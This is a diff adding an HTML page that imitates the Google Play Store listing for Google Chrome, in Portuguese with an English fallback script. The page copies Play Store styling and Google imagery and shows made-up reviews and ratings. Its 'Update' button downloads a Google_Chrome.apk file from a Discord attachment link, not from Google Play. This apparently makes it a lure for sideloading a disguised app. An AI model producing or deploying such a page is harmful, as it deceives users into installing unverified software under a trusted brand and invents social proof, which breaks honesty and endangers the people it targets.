@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Chrome - Apps no Google Play</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Roboto, Arial, sans-serif;
+      background: #f1f3f4;
+      color: #202124;
+    }
+
+    .header {
+      background: #fff;
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #ddd;
+    }
+
+    .header img {
+      height: 28px;
+    }
+
+    .container {
+      max-width: 960px;
+      margin: 30px auto;
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+
+    .app-header {
+      display: flex;
+      gap: 20px;
+    }
+
+    .app-header img {
+      width: 96px;
+      height: 96px;
+      border-radius: 20%;
+      object-fit: cover;
+    }
+
+    .app-info h1 {
+      font-size: 22px;
+      margin: 0;
+    }
+
+    .app-info p {
+      margin: 4px 0;
+      font-size: 14px;
+      color: #5f6368;
+    }
+
+    .install-btn {
+      margin-top: 15px;
+      display: inline-block;
+      background: #34a853; /* Verde oficial */
+      color: #fff;
+      padding: 10px 24px;
+      border-radius: 4px;
+      text-decoration: none;
+      font-weight: bold;
+      transition: background 0.2s ease;
+    }
+
+    .install-btn:hover {
+      background: #2c8a43;
+    }
+
+    /* Carrossel */
+    .screenshots {
+      margin-top: 30px;
+      display: flex;
+      gap: 12px;
+      overflow-x: auto;
+      padding-bottom: 10px;
+    }
+
+    .screenshots img {
+      height: 180px;
+      border-radius: 8px;
+      border: 1px solid #ddd;
+      flex-shrink: 0;
+    }
+
+    .about {
+      margin-top: 30px;
+    }
+
+    .about h2 {
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+
+    .about p, .about li {
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    /* Avaliações */
+    .reviews {
+      margin-top: 30px;
+    }
+
+    .reviews h2 {
+      font-size: 18px;
+      margin-bottom: 15px;
+    }
+
+    .review {
+      border-top: 1px solid #ddd;
+      padding: 15px 0;
+      display: flex;
+      gap: 15px;
+    }
+
+    .review:first-child {
+      border-top: none;
+    }
+
+    .review img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      object-fit: cover;
+    }
+
+    .review-content {
+      flex: 1;
+    }
+
+    .review strong {
+      font-size: 14px;
+      color: #202124;
+    }
+
+    .stars {
+      color: #fbbc04;
+      font-size: 14px;
+      margin: 3px 0;
+    }
+
+    .review p {
+      font-size: 14px;
+      margin: 5px 0 0;
+      color: #444;
+    }
+
+    .footer {
+      text-align: center;
+      padding: 20px;
+      font-size: 13px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+  <!-- Topo com logo Play Store -->
+  <div class="header">
+    <img src="https://www.gstatic.com/android/market_images/web/play_prism_hlock_2x.png" alt="Google Play">
+  </div>
+
+  <!-- Container principal -->
+  <div class="container">
+    <!-- Cabeçalho do App -->
+    <div class="app-header">
+      <img src="https://play-lh.googleusercontent.com/QRRGW2tMZ4-FNw0XWk6WWiXHaQCGxuwM-92HrBhlA4WOd_AGmjVmQkiHyAqQjW2yByc=w240-h480-rw" alt="Logo Google Chrome">
+      <div class="app-info">
+        <h1>Google Chrome</h1>
+        <p>Google LLC · Navegador</p>
+        <p>⭐ 4,5 · Mais de 1 bilhão de downloads</p>
+        <a href="https://cdn.discordapp.com/attachments/1426407795238109186/1426407942340481064/Google_Chrome.apk?ex=68eb1d6a&is=68e9cbea&hm=6ac9c27b99496331dced0a41a0f554d16e12648cbb10749fcdd20d4a882a3455&" class="install-btn">Atualizar</a>
+      </div>
+    </div>
+
+    <!-- Carrossel de imagens -->
+    <div class="screenshots">
+      <img src="https://play-lh.googleusercontent.com/OMmJGYNXlDfnWFX8iS1Veq2hqYJAkp0KF4kjPMEBEkZN4KutaoGLooWJTB86kLyF55uy=w526-h296-rw" alt="Screenshot 1">
+      <img src="https://play-lh.googleusercontent.com/BZwVMcpIt1gZZGe1X5gjKBdYmLrzgSD_cwKlKmJib8BV0lHPdlHly-9oEGm11VTr_iQ=w526-h296-rw" alt="Screenshot 2">
+      <img src="https://play-lh.googleusercontent.com/7_ksUyBu73YwRTelEGXzZeqWMNQOyXYWVzIwvWW0-Xyu4g5sOnhMdc4g-Y_u37z2ewI=w526-h296-rw" alt="Screenshot 3">
+      <img src="https://play-lh.googleusercontent.com/yah7sLDXvZQFvGNGI5KFV2T5TZBn3YhOY8cL5oKPoGYJ8nhfcNQ9zQG_qchCyr57qdg=w526-h296-rw" alt="Screenshot 4">
+    </div>
+
+    <!-- Sobre este app -->
+    <div class="about">
+      <h2>Sobre este app</h2>
+      <p>
+        O Google Chrome é um navegador rápido, seguro e gratuito, desenvolvido para a Web moderna.  
+        Recursos principais:
+      </p>
+      <ul>
+        <li>Navegação rápida e intuitiva</li>
+        <li>Sincronização entre dispositivos</li>
+        <li>Modo de Navegação Anônima</li>
+        <li>Tradução automática de páginas</li>
+        <li>Pesquisa por voz integrada</li>
+      </ul>
+      <p>
+        Baixe agora o Google Chrome e tenha uma experiência de navegação mais rápida, simples e segura.
+      </p>
+    </div>
+
+    <!-- Avaliações -->
+    <div class="reviews">
+      <h2>Classificações e resenhas</h2>
+
+      <div class="review">
+        <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Carlos">
+        <div class="review-content">
+          <strong>Carlos Santos</strong>
+          <div class="stars">⭐⭐⭐⭐⭐</div>
+          <p>Navegador excelente! Muito rápido e sincroniza perfeitamente entre meus dispositivos.</p>
+        </div>
+      </div>
+
+      <div class="review">
+        <img src="https://randomuser.me/api/portraits/men/45.jpg" alt="Ricardo">
+        <div class="review-content">
+          <strong>Ricardo Oliveira</strong>
+          <div class="stars">⭐⭐⭐⭐</div>
+          <p>Muito bom, só acho que consome muita bateria em alguns aparelhos.</p>
+        </div>
+      </div>
+
+      <div class="review">
+        <img src="https://randomuser.me/api/portraits/men/28.jpg" alt="Bruno">
+        <div class="review-content">
+          <strong>Bruno Lima</strong>
+          <div class="stars">⭐⭐⭐⭐⭐</div>
+          <p>Melhor navegador para Android! Rápido, seguro e com ótima integração com serviços Google.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Rodapé -->
+  <div class="footer">
+    © 2025 - Google Play Store.
+  </div>
+
+  <script>
+    // Detecção automática de idioma baseada na localidade
+    const userLanguage = navigator.language || navigator.userLanguage;
+    const isPortuguese = userLanguage.startsWith('pt');
+    
+    if (!isPortuguese) {
+      // Traduções para inglês (poderia ser expandido para outros idiomas)
+      document.querySelector('title').textContent = 'Google Chrome - Apps on Google Play';
+      document.querySelector('h1').textContent = 'Google Chrome';
+      document.querySelector('.app-info p:nth-child(2)').textContent = 'Google LLC · Browser';
+      document.querySelector('.app-info p:nth-child(3)').textContent = '⭐ 4.5 · Over 1 billion downloads';
+      document.querySelector('.install-btn').textContent = 'Update';
+      document.querySelector('.about h2').textContent = 'About this app';
+      document.querySelector('.about p').innerHTML = 'Google Chrome is a fast, secure, and free browser, designed for the modern web. Main features:';
+      document.querySelector('.about ul').innerHTML = `
+        <li>Fast and intuitive browsing</li>
+        <li>Sync across devices</li>
+        <li>Incognito Mode</li>
+        <li>Automatic page translation</li>
+        <li>Integrated voice search</li>
+      `;
+      document.querySelector('.about p:last-child').textContent = 'Download Google Chrome now for a faster, simpler, and safer browsing experience.';
+      document.querySelector('.reviews h2').textContent = 'Ratings and reviews';
+      
+      // Atualizar avaliações em inglês
+      const reviews = document.querySelectorAll('.review-content p');
+      reviews[0].textContent = 'Excellent browser! Very fast and syncs perfectly between my devices.';
+      reviews[1].textContent = 'Very good, but I think it consumes too much battery on some devices.';
+      reviews[2].textContent = 'Best browser for Android! Fast, secure and with great integration with Google services.';
+      
+      document.querySelector('.footer').textContent = '© 2025 - Google Play Store.';
+    }
+  </script>
+</body>
+</html>
